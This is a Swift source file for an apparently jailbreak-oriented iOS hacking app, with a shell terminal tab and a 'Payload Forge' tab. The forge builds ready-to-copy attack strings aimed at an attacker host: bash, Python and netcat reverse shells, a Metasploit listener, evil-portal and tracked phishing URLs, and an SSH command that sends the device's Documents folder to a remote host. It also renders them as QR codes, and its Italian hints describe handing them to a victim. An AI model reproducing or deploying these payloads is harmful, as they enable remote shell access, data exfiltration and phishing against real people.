import SwiftUI
import CoreImage

struct ToolsTab: View {
    @State private var mode = 0
    var body: some View {
        NavigationStack {
            VStack(spacing: 0) {
                Picker("tool", selection: $mode) {
                    Text("Terminal").tag(0)
                    Text("Forge").tag(1)
                }
                .pickerStyle(.segmented)
                .padding(10)
                if mode == 0 { TerminalView() } else { ForgeView() }
            }
            .background(Color.bg.ignoresSafeArea())
            .navigationTitle("Tools")
            .navigationBarTitleDisplayMode(.inline)
        }
        .preferredColorScheme(.dark)
    }
}

// MARK: - Terminal

struct TerminalView: View {
    @State private var lines: [LogEntry] = []
    @State private var input = ""
    @State private var running = false
    @FocusState private var focused: Bool

    private let quick: [(String, String)] = [
        ("whoami", "whoami"),
        ("uname", "uname -a"),
        ("jb", "ls /var/jb/usr/bin"),
        ("procs", "ps aux"),
        ("ports", "netstat -an"),
        ("disk", "df -h"),
        ("wifi", "ls /var/mobile"),
        ("curl me", "curl -s ifconfig.me"),
    ]

    var body: some View {
        VStack(spacing: 0) {
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 8) {
                    ForEach(ShellRunner.shared.availableTools, id: \.self) { t in
                        Chip(text: t, active: false) { input = "\(t) " ; focused = true }
                    }
                    ForEach(quick, id: \.0) { q in
                        Chip(text: q.0, active: false) { submit(q.1) }
                    }
                }
                .padding(.horizontal, 10)
            }
            .padding(.vertical, 8)

            ScrollViewReader { proxy in
                ScrollView {
                    LazyVStack(alignment: .leading, spacing: 4) {
                        ForEach(lines) { l in
                            Text(l.text)
                                .font(.system(size: 11, design: .monospaced))
                                .foregroundColor(l.level == .exec ? .redHat : (l.level == .good ? .ok : .white.opacity(0.85)))
                                .textSelection(.enabled)
                                .id(l.id)
                        }
                    }
                    .padding(12)
                }
                .background(Color(hex: 0x070709))
                .onChange(of: lines.count) { _ in
                    withAnimation { proxy.scrollTo(lines.last?.id, anchor: .bottom) }
                }
            }

            HStack(spacing: 10) {
                Text("rhs")
                    .font(.system(size: 12, weight: .heavy, design: .monospaced))
                    .foregroundColor(.redHat)
                TextField(running ? "in esecuzione…" : "comando…", text: $input)
                    .textFieldStyle(.plain)
                    .font(.system(size: 13, design: .monospaced))
                    .focused($focused)
                    .onSubmit { submit(input) }
                Button {
                    Haptics.tap()
                    submit(input)
                } label: {
                    Image(systemName: "play.fill")
                        .font(.system(size: 13, weight: .bold))
                        .foregroundColor(running ? .dim : .redHat)
                }
                .disabled(running)
                Button {
                    lines.removeAll()
                } label: {
                    Image(systemName: "trash")
                        .font(.system(size: 13)).foregroundColor(.dim)
                }
            }
            .padding(12)
            .background(Color.surface)
        }
        .onAppear { focused = true }
    }

    private func submit(_ raw: String) {
        let cmd = raw.trimmingCharacters(in: .whitespaces)
        guard !cmd.isEmpty, !running else { return }
        input = ""
        running = true
        Haptics.tap()
        lines.append(LogEntry(level: .exec, text: "$ \(cmd)"))
        let parts = cmd.split(separator: " ", omittingEmptySubsequences: true).map(String.init)
        guard let head = parts.first else { running = false; return }
        let args = Array(parts.dropFirst())
        ShellRunner.shared.stream(head, args: args, line: { l in
            DispatchQueue.main.async {
                lines.append(LogEntry(level: .info, text: l))
            }
        }, onExit: { code in
            DispatchQueue.main.async {
                lines.append(LogEntry(level: .warn, text: "exit \(code)"))
                running = false
            }
        })
    }
}

// MARK: - Payload Forge

struct ForgeView: View {
    enum Kind: String, CaseIterable, Identifiable {
        case revBash = "Bash"
        case revPy = "Python"
        case revNC = "Netcat"
        case msf = "MSF Handler"
        case portal = "Evil Portal"
        case phish = "Phish URL"
        case sshExfil = "SSH Exfil"
        case webhook = "Webhook Catch"
        var id: String { rawValue }
    }

    @State private var kind: Kind = .revBash
    @State private var host = ""
    @State private var port = "4444"
    @State private var path = "/login"
    @State private var copied = false

    private var payload: String {
        let h = host.isEmpty ? "ATTACKER_IP" : host
        let p = Int(port) ?? 4444
        switch kind {
        case .revBash:
            return "bash -i >& /dev/tcp/\(h)/\(p) 0>&1"
        case .revPy:
            return "python3 -c \"import socket,os,pty;s=socket.socket();s.connect(('\(h)',\(p)));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')\""
        case .revNC:
            return "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc \(h) \(p) > /tmp/f"
        case .msf:
            return "msfconsole -q -x \"use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST \(h); set LPORT \(p); run\""
        case .portal:
            return "http://\(h):\(p)\(path.isEmpty ? "/login" : path)"
        case .phish:
            let track = UUID().uuidString.prefix(8)
            return "https://\(h)\(path.isEmpty ? "/session" : path)?src=qr&sid=\(track)"
        case .sshExfil:
            return "tar czf - /var/mobile/Documents 2>/dev/null | ssh \(h) 'cat > /tmp/exfil-\(Int(Date().timeIntervalSince1970)).tar.gz'"
        case .webhook:
            return "python3 -m http.server \(p) --bind 0.0.0.0"
        }
    }

    private var hint: String {
        switch kind {
        case .revBash, .revPy, .revNC:
            return "Listener: usa MSF Handler (tab) su \(host.isEmpty ? "host" : host):\(port) o nc -lvnp \(port)"
        case .msf: return "Esegui su host attacker. Payload va adattato all'arch del target."
        case .portal: return "Servi la pagina con hostapd + dnsmasq; il QR lo mostra il telefono alla vittima."
        case .phish: return "Il sid traccia le aperture. Manda come QR o link."
        case .sshExfil: return "Richiede chiave ssh sul target. Direzione: compress → pipe → remoto."
        case .webhook: return "Server catch-all: le request arrivano nel log; exfil via GET query string."
        }
    }

    var body: some View {
        ScrollView {
            VStack(alignment: .leading, spacing: 14) {
                ScrollView(.horizontal, showsIndicators: false) {
                    HStack(spacing: 8) {
                        ForEach(Kind.allCases) { k in
                            Chip(text: k.rawValue, active: kind == k) { kind = k }
                        }
                    }
                }
                HStack(spacing: 10) {
                    TextField("attacker host/IP", text: $host)
                        .textFieldStyle(.plain).font(.system(size: 13, design: .monospaced))
                        .padding(10).background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
                        .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
                    TextField("port", text: $port)
                        .textFieldStyle(.plain).font(.system(size: 13, design: .monospaced))
                        .frame(width: 80)
                        .padding(10).background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
                        .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
                }
                if kind == .portal || kind == .phish {
                    TextField("path", text: $path)
                        .textFieldStyle(.plain).font(.system(size: 13, design: .monospaced))
                        .padding(10).background(RoundedRectangle(cornerRadius: 10).fill(Color(hex: 0x070709)))
                        .overlay(RoundedRectangle(cornerRadius: 10).strokeBorder(Color.white.opacity(0.1), lineWidth: 1))
                }

                Text("PAYLOAD").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                Text(payload)
                    .font(.system(size: 12, design: .monospaced))
                    .padding(12).frame(maxWidth: .infinity, alignment: .leading)
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color(hex: 0x070709)))
                    .overlay(RoundedRectangle(cornerRadius: 12).strokeBorder(Color.white.opacity(0.08), lineWidth: 1))
                    .foregroundColor(.ok)
                    .textSelection(.enabled)

                HStack(spacing: 10) {
                    Button {
                        UIPasteboard.general.string = payload
                        Haptics.win()
                        copied = true
                        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) { copied = false }
                    } label: {
                        Label(copied ? "COPIED" : "COPY", systemImage: copied ? "checkmark" : "doc.on.doc")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.redHat))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())

                    Button {
                        if !payload.isEmpty {
                            ShellRunner.shared.stream("echo", args: [payload], line: { _ in })
                        }
                        Haptics.tap()
                    } label: {
                        Label("ECHO", systemImage: "terminal")
                            .font(.system(size: 13, weight: .bold, design: .rounded))
                            .frame(maxWidth: .infinity).padding(.vertical, 12)
                    }
                    .background(RoundedRectangle(cornerRadius: 12).fill(Color.surfaceHi))
                    .foregroundColor(.white)
                    .buttonStyle(ScaleButton())
                }

                if payload.count < 400, let img = QRCodec.image(payload) {
                    Text("QR PAYLOAD").font(.system(size: 10, weight: .bold)).foregroundColor(.dim)
                    Image(uiImage: img)
                        .interpolation(.none)
                        .resizable()
                        .scaledToFit()
                        .frame(width: 220, height: 220)
                        .padding(14).background(Color.white)
                        .cornerRadius(14)
                        .frame(maxWidth: .infinity)
                }

                Text(hint).font(.caption).foregroundColor(.dim)
            }
            .padding(16)
        }
        .background(Color.bg.ignoresSafeArea())
    }
}

enum QRCodec {
    static func image(_ s: String) -> UIImage? {
        let data = Data(s.utf8)
        guard let filter = CIFilter(name: "CIQRCodeGenerator") else { return nil }
        filter.setValue(data, forKey: "inputMessage")
        filter.setValue("H", forKey: "inputCorrectionLevel")
        guard let out = filter.outputImage else { return nil }
        let scaled = out.transformed(by: CGAffineTransform(scaleX: 12, y: 12))
        guard let cg = CIContext().createCGImage(scaled, from: scaled.extent) else { return nil }
        return UIImage(cgImage: cg)
    }
}
